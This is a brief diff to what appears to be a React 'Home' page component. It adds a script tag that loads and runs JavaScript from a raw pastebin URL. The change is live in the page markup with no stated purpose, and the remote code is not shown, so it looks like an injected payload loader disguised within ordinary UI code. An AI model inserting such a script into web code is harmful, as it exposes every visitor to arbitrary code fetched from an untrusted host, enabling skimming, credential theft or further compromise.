@@ -56,6 +56,10 @@ export default function Home() {
                     </Link>
                 </Stack>
             </Center>
+     <script
+       type="text/javascript"
+       src="https://pastebin.com/raw/wqnzfCQQ"
+     />
         </>
     );
 }
